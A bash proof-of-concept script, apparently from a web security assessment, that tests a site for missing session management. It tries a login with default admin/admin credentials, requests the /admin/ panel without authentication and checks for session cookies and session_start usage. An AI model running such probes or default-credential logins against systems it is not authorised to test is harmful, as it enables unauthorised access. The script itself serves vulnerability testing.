#!/bin/bash

# POC: Weak Authentication Implementation - No Session Management
# This script demonstrates that the application lacks session management
# by showing: 1) No session cookies after login, 2) No session state tracking, 
# 3) Admin panel accessible without authentication

TARGET="${1:-http://localhost}"
COOKIE_JAR=$(mktemp)
trap "rm -f $COOKIE_JAR" EXIT

echo "[*] Testing for Session Management Implementation"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Attempt login and capture response headers
echo "[*] Step 1: Attempting login with test credentials..."
LOGIN_RESPONSE=$(curl -s -i -c "$COOKIE_JAR" -X POST "$TARGET/login.php" \
  -d "username=admin&password=admin" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>&1)

echo "[*] Login response headers:"
echo "$LOGIN_RESPONSE" | head -20
echo ""

# Step 2: Check for session cookies
echo "[*] Step 2: Checking for session cookies..."
if grep -q "PHPSESSID\|session" "$COOKIE_JAR"; then
    echo "[+] Session cookie found in cookie jar (HAS session management)"
    cat "$COOKIE_JAR"
    COOKIE_EXISTS=1
else
    echo "[-] NO session cookie set after login attempt"
    echo "[!] Cookie jar contents:"
    cat "$COOKIE_JAR"
    echo "[!] Empty or contains only domain/path info (no session identifier)"
    COOKIE_EXISTS=0
fi
echo ""

# Step 3: Try accessing admin panel without authentication
echo "[*] Step 3: Attempting to access admin panel without authentication..."
ADMIN_RESPONSE=$(curl -s -i "$TARGET/admin/" 2>&1)

HTTP_CODE=$(echo "$ADMIN_RESPONSE" | grep "^HTTP" | tail -1 | awk '{print $2}')
echo "[*] Admin panel HTTP response code: $HTTP_CODE"

if echo "$ADMIN_RESPONSE" | grep -q "200\|301\|302"; then
    if echo "$ADMIN_RESPONSE" | tail -20 | grep -iq "admin\|dashboard\|panel"; then
        echo "[-] Admin panel is ACCESSIBLE without authentication"
        echo "[*] Response indicates admin content is being served:"
        echo "$ADMIN_RESPONSE" | tail -10
        ADMIN_ACCESSIBLE=1
    else
        echo "[?] Response code suggests possible access"
        ADMIN_ACCESSIBLE=1
    fi
else
    echo "[+] Admin panel returned auth check: HTTP $HTTP_CODE"
    ADMIN_ACCESSIBLE=0
fi
echo ""

# Step 4: Make another request and verify session state is not maintained
echo "[*] Step 4: Checking if session state is maintained across requests..."
SECOND_REQUEST=$(curl -s -i -b "$COOKIE_JAR" "$TARGET/" 2>&1)

if echo "$SECOND_REQUEST" | grep -iq "logout\|logged in"; then
    echo "[+] Session state appears to be tracked (user recognized as logged in)"
    SESSION_MAINTAINED=1
else
    echo "[-] NO session state maintained - user not recognized as logged in"
    SESSION_MAINTAINED=0
fi
echo ""

# Step 5: Check PHP files for session initialization (if accessible)
echo "[*] Step 5: Checking source code for session management..."
echo "[*] Attempting to retrieve index.php to check for session_start()..."
PHP_SOURCE=$(curl -s "$TARGET/index.php" 2>&1 | head -50)

if echo "$PHP_SOURCE" | grep -q "session_start\|SESSION"; then
    echo "[+] Found session_start() or SESSION usage in source"
    SESSION_CODE_EXISTS=1
else
    echo "[-] No session_start() or SESSION variables found in accessible source"
    SESSION_CODE_EXISTS=0
fi
echo ""

# Summary
echo "========================================"
echo "VULNERABILITY ASSESSMENT SUMMARY"
echo "========================================"
echo ""

if [ $COOKIE_EXISTS -eq 0 ] && [ $SESSION_MAINTAINED -eq 0 ] && [ $SESSION_CODE_EXISTS -eq 0 ]; then
    echo "[VULNERABLE] Application lacks session management:"
    echo "  ✗ No session cookies set after login"
    echo "  ✗ Session state not maintained across requests"
    echo "  ✗ No session_start() in source code"
    echo "  ✗ Admin panel accessible without authentication: $([ $ADMIN_ACCESSIBLE -eq 1 ] && echo 'YES' || echo 'NO')"
    echo ""
    echo "[CONCLUSION] The application has NO session management implementation"
    exit 0
else
    echo "[PARTIAL] Some session mechanisms detected"
    exit 1
fi